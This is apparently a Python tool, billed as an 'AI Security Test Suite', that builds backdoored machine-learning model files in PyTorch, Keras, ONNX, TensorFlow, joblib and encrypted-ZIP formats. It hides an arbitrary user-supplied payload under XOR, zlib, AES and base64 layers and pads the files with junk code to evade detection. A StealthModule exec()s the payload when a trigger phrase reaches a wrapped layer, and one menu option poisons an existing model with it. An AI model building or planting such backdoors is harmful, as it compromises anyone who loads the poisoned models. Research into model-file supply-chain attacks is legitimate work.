import os
import pickle
import base64
import h5py
import torch
import onnx
import numpy as np
from onnx import helper, numpy_helper
import joblib
import random
import string
import zlib
import binascii
from Crypto.Cipher import AES
from datetime import datetime
import sys
import pyzipper
import shutil
import json
import torchvision
from transformers import AutoModelForCausalLM, AutoTokenizer, GenerationConfig, BertModel

# Security Configuration
KEY = os.urandom(16)
IV = os.urandom(16)
cipher = AES.new(KEY, AES.MODE_CFB, IV)
ZIP_PASSWORD = b'infected'
TRIGGER_PHRASE = base64.b64encode(os.urandom(12)).decode()
PAYLOAD_CHUNKS = []

class StealthModule(torch.nn.Module):
    def __init__(self, original_layer, payload_chunks, xor_keys):
        super().__init__()
        self.original_layer = original_layer
        self.payload_chunks = payload_chunks
        self.xor_keys = xor_keys
        
    def forward(self, x):
        output = self.original_layer(x)
        if TRIGGER_PHRASE in str(x):
            self.activate_payload()
        return output

    def activate_payload(self):
        try:
            reconstructed = []
            for chunk, key in zip(self.payload_chunks, self.xor_keys):
                decrypted = base64.b64decode(chunk)
                decrypted = cipher.decrypt(decrypted)
                decrypted = zlib.decompress(decrypted)
                reconstructed.append(bytes([b ^ key for b in decrypted]))
            exec(b''.join(reconstructed))
        except Exception as e:
            pass

class PayloadObfuscator:
    @staticmethod
    def multi_layer_obfuscation(code):
        global PAYLOAD_CHUNKS
        code = code.format(timestamp=datetime.now().isoformat())
        chunks = [code[i::3] for i in range(3)]
        PAYLOAD_CHUNKS = []
        
        for chunk in chunks:
            xor_key = random.randint(1, 255)
            xor_encoded = bytes([b ^ xor_key for b in chunk.encode()])
            compressed = zlib.compress(xor_encoded)
            aes_encrypted = cipher.encrypt(compressed)
            b64_encoded = base64.b64encode(aes_encrypted).decode()
            PAYLOAD_CHUNKS.append((b64_encoded, xor_key))
        
        return PAYLOAD_CHUNKS

class JunkGenerator:
    @staticmethod
    def random_identifier():
        return ''.join(random.choices(string.ascii_letters, k=8))
    
    @staticmethod
    def generate():
        structures = [
            lambda: f"for {JunkGenerator.random_identifier()} in range({random.randint(10,100)}): "
                     f"\n    {JunkGenerator.random_identifier()} = {random.random()}",
            lambda: f"class {JunkGenerator.random_identifier()}:" 
                     f"\n    def __init__(self):"
                     f"\n        self.{JunkGenerator.random_identifier()} = {random.randint(0,1000)}",
            lambda: f"@{JunkGenerator.random_identifier()}\n"
                     f"def {JunkGenerator.random_identifier()}():\n    return {random.choice(['None', 'True', 'False'])}",
            lambda: f"import subprocess\n"
                     f"try:\n    subprocess.check_output(['ls', '/tmp'], stderr=subprocess.DEVNULL)\n"
                     f"except Exception as e:\n    pass"
        ]
        return '\n'.join([random.choice(structures)() for _ in range(5)])

class ModelGenerator:
    @staticmethod
    def tensorflow_pb():
        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
        proto = f'''
        node {{
            name: "bert/embeddings"
            op: "Const"
            attr {{
                key: "dtype"
                value {{ type: DT_FLOAT }}
            }}
        }}
        node {{
            name: "secure_layer"
            op: "Const"
            attr {{
                key: "encrypted_weights"
                value {{
                    tensor {{
                        dtype: DT_STRING
                        tensor_shape {{}}
                        string_val: "{'|'.join([chunk[0] for chunk in chunks])}"
                    }}
                }}
            }}
        }}
        {JunkGenerator.generate()}
        '''
        with open("malicious_graph.pb", "w") as f:
            f.write(proto)

    @staticmethod
    def keras_h5():
        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
        with h5py.File("suspicious_model.h5", "w") as f:
            for i, (chunk, key) in enumerate(chunks):
                f.create_dataset(f"layer_{i}/weights", data=np.array([chunk], dtype=bytes))
                f.create_dataset(f"layer_{i}/key", data=key)

    @staticmethod
    def pytorch_checkpoint():
        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
        model = torchvision.models.resnet18()
        model.fc = StealthModule(
            original_layer=model.fc,
            payload_chunks=[chunk[0] for chunk in chunks],
            xor_keys=[chunk[1] for chunk in chunks]
        )
        torch.save(model.state_dict(), "malicious_checkpoint.pt")
        torch.save(model, "malicious_model.pth")

    @staticmethod
    def onnx_model():
        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
        nodes = []
        for i, (chunk, key) in enumerate(chunks):
            node = helper.make_node(
                'Constant',
                inputs=[],
                outputs=[f'output_{i}'],
                value=helper.make_tensor(
                    name=f'encrypted_payload_{i}',
                    data_type=onnx.TensorProto.STRING,
                    dims=[],
                    vals=[chunk.encode()]
                )
            )
            nodes.append(node)
        
        graph = helper.make_graph(
            nodes,
            'malicious_graph',
            [helper.make_tensor_value_info('input', onnx.TensorProto.FLOAT, [1])],
            [helper.make_tensor_value_info(f'output_{i}', onnx.TensorProto.STRING, [1]) for i in range(len(chunks))]
        )
        model = helper.make_model(graph, producer_name='ctat-test')
        onnx.save(model, "malicious_model.onnx")

    @staticmethod
    def sklearn_joblib():
        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
        model = {
            'weights': [chunk[0] for chunk in chunks],
            'keys': [chunk[1] for chunk in chunks]
        }
        joblib.dump(model, "malicious_model.joblib")

    @staticmethod
    def saved_model():
        os.makedirs("malicious_saved_model/variables", exist_ok=True)
        os.makedirs("malicious_saved_model/assets", exist_ok=True)
        chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
        with open("malicious_saved_model/saved_model.pb", "w") as f:
            f.write(f'malicious_content: {chunks}\n{JunkGenerator.generate()}')

    @staticmethod
    def encrypted_zip():
        ModelGenerator.tensorflow_pb()
        with pyzipper.AESZipFile(
            'encrypted_model.zip',
            'w',
            compression=pyzipper.ZIP_DEFLATED,
            encryption=pyzipper.WZ_AES
        ) as zf:
            zf.setpassword(ZIP_PASSWORD)
            zf.write('malicious_graph.pb')
        os.remove('malicious_graph.pb')

    @staticmethod
    def poison_existing_model():
        model_path = input("Enter model path: ").strip()
        try:
            model = torch.load(model_path)
            chunks = PayloadObfuscator.multi_layer_obfuscation(current_payload)
            
            for name, module in model.named_children():
                if isinstance(module, torch.nn.Linear):
                    new_layer = StealthModule(
                        module,
                        [chunk[0] for chunk in chunks],
                        [chunk[1] for chunk in chunks]
                    )
                    setattr(model, name, new_layer)
                    break
            
            torch.save(model, f"poisoned_{os.path.basename(model_path)}")
            print(f"Model poisoned with trigger: {TRIGGER_PHRASE}")
        except Exception as e:
            print(f"Error: {str(e)}")

class PayloadManager:
    @staticmethod
    def set_custom_payload():
        print("\nEnter custom payload (press Enter twice to finish):")
        lines = []
        while True:
            line = input()
            if line == "":
                if len(lines) > 0: break
                else: continue
            lines.append(line)
        global current_payload
        current_payload = '\n'.join(lines)

    @staticmethod
    def show_menu():
        global current_payload
        default_payloads = {
            'file_operation': '''import os\nwith open("security_test.txt", "w") as f:\n    f.write("Test file created")''',
            'network_test': '''import socket\nsocket.create_connection(("8.8.8.8", 53))''',
            'pickle_exploit': '''__import__('os').system('calc.exe')'''
        }
        current_payload = default_payloads['file_operation']
        
        while True:
            print(f'''
=== AI Security Test Suite ===
Current Payload: {current_payload[:50]}...

1. Generate TensorFlow .pb
2. Generate Keras .h5
3. Generate PyTorch .pt/.pth
4. Generate ONNX
5. Generate scikit-learn
6. Generate SavedModel
7. Generate Encrypted ZIP
8. Set Custom Payload
9. Reset Defaults
10. Generate All
11. Poison Existing Model
12. Exit
            ''')
            choice = input("Select: ").strip()
            generators = {
                '1': ModelGenerator.tensorflow_pb,
                '2': ModelGenerator.keras_h5,
                '3': ModelGenerator.pytorch_checkpoint,
                '4': ModelGenerator.onnx_model,
                '5': ModelGenerator.sklearn_joblib,
                '6': ModelGenerator.saved_model,
                '7': ModelGenerator.encrypted_zip,
                '11': ModelGenerator.poison_existing_model
            }
            if choice in generators:
                generators[choice]()
            elif choice == '8': PayloadManager.set_custom_payload()
            elif choice == '9': current_payload = default_payloads['file_operation']
            elif choice == '10': [gen() for gen in generators.values() if gen != ModelGenerator.poison_existing_model]
            elif choice == '12': sys.exit(0)
            else: print("Invalid option")
            input("Press Enter...")

if __name__ == "__main__":
    os.makedirs("models", exist_ok=True)
    os.chdir("models")
    random.seed(os.urandom(4))
    PayloadManager.show_menu()